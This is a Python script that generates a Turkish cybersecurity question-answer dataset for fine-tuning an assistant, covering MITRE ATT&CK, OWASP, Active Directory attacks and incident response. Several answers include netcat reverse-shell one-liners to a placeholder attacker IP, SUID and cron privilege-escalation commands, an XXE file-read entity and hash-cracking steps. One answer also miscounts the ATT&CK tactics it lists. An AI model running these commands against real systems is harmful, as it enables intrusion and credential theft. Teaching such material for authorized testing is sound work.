"""v0.3 distillation — RAG bilgi tabanina DAYALI Turkce cyber Q&A -> octopus_cyber_tr.jsonl.

Amac: Turkce cyber DERINLIGINI artirmak (v0.2'de sig kaliyordu). Teacher = guclu model
(bu ureticiyi yazan), kaynak = rag/knowledge/ (dogru MITRE/CVE/OWASP ID'leri). Yani
faktuel-dogru + Turkce + markaya uygun. build_sft.py seed_tr/*.jsonl'i topladigi icin
bu dosya otomatik karisima girer; upsampling (--seed-repeat) buna da uygulanir.

Kosul: uv run python data/sft/seed_tr/build_cyber_seed.py
"""
from __future__ import annotations

import json
from pathlib import Path

OUT = Path(__file__).resolve().parent / "octopus_cyber_tr.jsonl"

# (user, assistant) — Turkce, DOGRU ID'ler (rag/knowledge ile tutarli), yetkili durus.
PAIRS: list[tuple[str, str]] = [
    # --- MITRE ATT&CK ---
    ("MITRE ATT&CK'te taktik ile teknik farkı nedir?",
     "Taktik saldırganın **NEDEN**'ini (amacını), teknik ise **NASIL**'ını (yöntemini) tanımlar. "
     "Enterprise matrisi 14 taktik içerir: Reconnaissance (TA0043), Initial Access (TA0001), Execution "
     "(TA0002), Persistence (TA0003), Privilege Escalation (TA0004), Defense Evasion (TA0005), Credential "
     "Access (TA0006), Discovery (TA0007), Lateral Movement (TA0008), Collection (TA0009), Exfiltration "
     "(TA0010), Impact (TA0040). Her taktiğin altında teknikler (örn. T1558.003 Kerberoasting) yer alır."),
    ("Pass-the-Hash MITRE tekniği nedir?",
     "Pass-the-Hash **T1550.002** (Use Alternate Authentication Material: Pass the Hash) tekniğidir. "
     "Saldırgan parolanın düz metnini bilmeden NTLM hash'iyle kimlik doğrular. Savunma: yerel admin "
     "parolalarını benzersizleştir (LAPS), Protected Users grubu + Credential Guard, SMB imzalama."),
    ("DCSync saldırısı nedir, hangi MITRE ID?",
     "DCSync **T1003.006** (OS Credential Dumping: DCSync). Saldırgan, domain replication (DS-Replication-"
     "Get-Changes) hakkıyla bir DC'yi taklit edip tüm hesapların hash'lerini (krbtgt dahil) çeker. "
     "Savunma: replication haklarını sıkı denetle, anormal replication'ı (Event 4662) izle."),
    # --- Kerberoasting / AD ---
    ("Kerberoasting nasıl çalışır, adım adım?",
     "T1558.003. 1) Saldırgan AD'de kimliği doğrulanmış HERHANGİ bir kullanıcı olur. 2) SPN tanımlı servis "
     "hesaplarının TGS biletini ister (`GetUserSPNs.py -request` ya da Rubeus). 3) TGS, servis hesabının "
     "parola türevi anahtarıyla şifrelidir. 4) Çevrimdışı kırar (`hashcat -m 13100`). Çevrimdışı olduğu için "
     "hesap kilitlenmez, tespit zordur. Not: TGT değil **TGS** hedeflenir. Savunma: uzun/gMSA parola, AES zorla, 4769 izle."),
    ("AS-REP Roasting nedir?",
     "Kerberos ön kimlik doğrulaması (pre-auth) KAPALI olan hesaplara karşı yapılır: saldırgan bu "
     "hesaplar için AS-REP alıp çevrimdışı kırar (`hashcat -m 18200`). Savunma: 'Do not require Kerberos "
     "preauthentication' bayrağını kapat, güçlü parola. Kerberoasting'in (T1558.003) kardeşidir."),
    # --- OWASP ---
    ("OWASP Top 10 2021'de ilk sırada ne var?",
     "**A01:2021 – Broken Access Control** (Bozuk Erişim Kontrolü) birinci sıradadır — IDOR, yetki "
     "yükseltme, eksik fonksiyon-seviyesi kontrolü buraya girer. Ardından A02 Cryptographic Failures, "
     "A03 Injection (SQLi/XSS dahil), A04 Insecure Design, A05 Security Misconfiguration gelir."),
    ("IDOR nedir ve hangi OWASP kategorisi?",
     "IDOR (Insecure Direct Object Reference), kullanıcının bir nesne tanımlayıcısını (id, uuid) değiştirip "
     "başkasının verisine erişmesidir — **A01:2021 Broken Access Control** altındadır. Test: iki hesapla, "
     "A'nın id'sini B'nin oturumunda dene. Önleme: her istekte sunucu tarafı yetki kontrolü, dolaylı referans haritası."),
    ("SSRF hangi OWASP 2021 kategorisinde?",
     "SSRF (Server-Side Request Forgery) 2021'de kendi kategorisini aldı: **A10:2021 – Server-Side Request "
     "Forgery**. Sunucuyu iç kaynaklara/metadata'ya (169.254.169.254) istek atmaya kandırma. Önleme: "
     "allow-list, iç IP engelleme, yönlendirme doğrulama."),
    # --- Web attacks ---
    ("SQL injection türleri nelerdir?",
     "Başlıca türler: **In-band** (UNION-based, error-based — sonuç aynı kanalda), **Blind** (boolean-based "
     "ve time-based — sonuç dolaylı çıkarılır) ve **Out-of-band** (DNS/HTTP ile veri sızdırma). Yetkili "
     "testte `sqlmap --technique=BEUST` ile hepsini deneyebilirsin. Önleme her zaman parametreli sorgu."),
    ("Stored XSS ile Reflected XSS farkı?",
     "**Reflected XSS**: zararlı script istekte gelir, yanıtta anında yansır (kurban özel bağlantıya "
     "tıklamalı). **Stored XSS**: script sunucuda saklanır (yorum, profil) ve sayfayı açan herkeste çalışır "
     "— daha tehlikeli. **DOM-based**: tamamen istemci tarafında. Önleme: bağlama göre çıktı kaçışı + CSP."),
    ("XXE saldırısı nedir?",
     "XXE (XML External Entity), XML ayrıştırıcının dış varlıkları işlemesini istismar eder: "
     "`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` ile dosya okuma, SSRF, DoS. Önleme: XML ayrıştırıcıda "
     "dış varlıkları (DTD) KAPAT (`disallow-doctype-decl`), güncel kütüphane kullan."),
    # --- Privilege escalation ---
    ("Linux'ta SUID binary ile yetki yükseltme nasıl aranır?",
     "Yetkili lab'ında: `find / -perm -4000 -type f 2>/dev/null` ile SUID binary'leri listele. Sıra dışı "
     "olanı (örn. `find`, `nmap`, `vim`, özel bir binary) GTFOBins'te ara — SUID istismar yolu varsa root "
     "kabuk alırsın (örn. `find . -exec /bin/sh -p \\; -quit`). Ayrıca `sudo -l` ve capabilities (`getcap -r /`)."),
    ("Linux privesc'te yazılabilir cron nasıl istismar edilir?",
     "`cat /etc/crontab` ve cron dizinlerini incele. root olarak çalışan ama SANA yazılabilir bir betik "
     "varsa, içine kendi komutunu (örn. reverse shell ya da SUID kopyalama `cp /bin/bash /tmp/rootbash; "
     "chmod +s /tmp/rootbash`) ekleyip cron'un çalışmasını beklersin. `pspy` ile root cron'larını canlı izle. Kendi lab'ında."),
    # --- Reverse shells ---
    ("Netcat ile reverse shell nasıl kurulur?",
     "Yetkili testte — dinleyici saldırganda: `nc -lvnp 4444`. Hedefte (nc -e varsa): "
     "`nc HEDEF_YOK_SALDIRGAN_IP 4444 -e /bin/bash`. `-e` yoksa: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|"
     "/bin/bash -i 2>&1|nc SALDIRGAN_IP 4444 >/tmp/f`. Kabuğu `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'` "
     "ile stabilize et. Yalnız izinli kapsamda."),
    ("Bind shell ile reverse shell farkı nedir?",
     "**Reverse shell**: hedef, saldırgana bağlanır (giden trafik — firewall'ları daha kolay aşar, tercih "
     "edilir). **Bind shell**: hedef bir port açıp dinler, saldırgan ona bağlanır (gelen trafik — NAT/firewall "
     "arkasında zordur). Modern pentest'te genelde reverse shell kullanılır."),
    # --- Cloud / container ---
    ("Bulut metadata servisi (169.254.169.254) neden risklidir?",
     "SSRF ile ulaşılabilirse IAM geçici kimlik bilgilerini (AWS: `/latest/meta-data/iam/security-"
     "credentials/`) sızdırabilir → hesap ele geçirme. Savunma: AWS'de IMDSv2 zorla (token gerektirir), "
     "SSRF önle, en az yetkili instance rolü. Yetkili testte bulursan sömürme, kanıtla ve raporla."),
    ("Kubernetes'te bir pod ele geçirilirse saldırgan ne yapabilir?",
     "Pod içinden: service account token (`/var/run/secrets/kubernetes.io/serviceaccount/token`) ile API'ye "
     "erişim (yetkiye bağlı), ağ komşularını tara, hostPath/privileged mount varsa node'a kaç. Savunma: "
     "en az yetkili RBAC, `automountServiceAccountToken: false`, NetworkPolicy, Pod Security Standards (restricted), privileged pod yasak."),
    # --- Malware / IR ---
    ("Bir sunucuda kalıcılık (persistence) nerede aranır?",
     "T1053 (Scheduled Task/Job): `crontab -l`, `/etc/cron*`, systemd timer'ları. T1543 (servisler): "
     "yeni/değiştirilmiş systemd birimi. Ayrıca `~/.bashrc`/`.profile`, SSH `authorized_keys` (beklenmedik "
     "anahtar), `/etc/passwd` yeni kullanıcı, `LD_PRELOAD`. `find / -mtime -3` ile son değişenleri olay penceresiyle karşılaştır."),
    ("Olay müdahalesinde (IR) yaşam döngüsü aşamaları neler?",
     "NIST'e göre: **Hazırlık → Tespit & Analiz → Sınırlama (Containment) → Kök Sökme (Eradication) → "
     "Kurtarma (Recovery) → Ders Çıkarma (Lessons Learned).** Sınırlamada uçucu kanıtı (bellek, ağ "
     "bağlantıları) koru, sistemi kapatma; kök sökmede zararlıyı + kalıcılığı temizle, sonra temiz yedekten dön."),
    # --- Threat intel / CVE ---
    ("EternalBlue (MS17-010) nedir?",
     "SMBv1'deki bir uzaktan kod çalıştırma zafiyeti (CVE-2017-0144, MS17-010). WannaCry ve NotPetya bunu "
     "kullandı. Savunma: SMBv1'i tamamen kapat, MS17-010 yamasını uygula, SMB'yi internete açma. Yetkili "
     "testte Metasploit `exploit/windows/smb/ms17_010_eternalblue` ile lab'ında görebilirsin."),
    ("CVSS'te 7.5 skoru ne anlama gelir?",
     "CVSS 7.0–8.9 = **Yüksek (High)** ciddiyet. 7.5 tipik olarak ağdan erişilebilen, kimlik doğrulamasız "
     "ama etkisi tek boyutta (örn. yalnız gizlilik ya da yalnız erişilebilirlik) olan bir zafiyettir. "
     "9.0–10.0 Kritik, 4.0–6.9 Orta, 0.1–3.9 Düşük. Yamalama önceliğini skor + istismar edilebilirlik belirler."),
    # --- Pentest tools ---
    ("Nmap'te -sS ile -sT tarama farkı nedir?",
     "`-sS` (SYN/half-open): SYN gönderir, SYN-ACK gelince bağlantıyı tamamlamadan RST atar — hızlı, daha "
     "sessiz, root ister. `-sT` (TCP connect): tam üçlü el sıkışma yapar — root gerektirmez ama loglara "
     "düşer ve yavaştır. Yetkili tarama için genelde `-sS -sV`. UDP için ayrı `-sU`."),
    ("Hashcat mod numaraları: NTLM, NetNTLMv2, Kerberoast?",
     "`-m 1000` NTLM (yerel hash), `-m 5600` NetNTLMv2 (Responder ile yakalanan), `-m 13100` Kerberoast "
     "(TGS/RC4), `-m 18200` AS-REP. Örnek: `hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule`. "
     "Kuralları + maskeyi (`-a 3`) birleştir. Yalnız kendi/izinli hash'lerinde."),
    ("Gobuster ile ffuf arasındaki fark nedir?",
     "İkisi de dizin/dosya/alt-alan keşfi (fuzzing) yapar. **ffuf** daha hızlı ve esnek (herhangi bir yere "
     "`FUZZ` koyabilirsin: parametre, header, POST body). **gobuster** basit ve hızlı, mod tabanlı (`dir`, "
     "`dns`, `vhost`). Yetkili kapsamda ffuf çok yönlülüğü için tercih edilir."),
    # --- Network / defense ---
    ("SYN flood saldırısı nasıl çalışır ve nasıl savunulur?",
     "Saldırgan çok sayıda SYN gönderir ama el sıkışmayı tamamlamaz (ACK atmaz) → sunucunun yarı-açık "
     "bağlantı kuyruğu dolar, meşru bağlantı kabul edilemez (DoS). Savunma: **SYN cookies** (kuyruk yerine "
     "kriptografik çerez), backlog artır, rate limiting, upstream DDoS koruması (CDN/scrubbing)."),
    ("WPA2 ve WPA3 arasındaki güvenlik farkı nedir?",
     "WPA2 (PSK) 4'lü el sıkışması çevrimdışı sözlük saldırısına açıktır (handshake yakalanıp kırılabilir). "
     "WPA3, **SAE (Dragonfly)** ile bunu engeller (çevrimdışı kırma pratikte olmaz), ileri gizlilik (forward "
     "secrecy) ve daha iyi açık-ağ şifrelemesi sunar. Kendi ağında WPA3'e geç + uzun parola."),
]


def main() -> None:
    with OUT.open("w", encoding="utf-8") as f:
        for user, assistant in PAIRS:
            rec = {"messages": [
                {"role": "user", "content": user},
                {"role": "assistant", "content": assistant},
            ]}
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print(f"[OK] {len(PAIRS)} bilgi-tabanli Turkce cyber Q&A -> {OUT}")


if __name__ == "__main__":
    main()
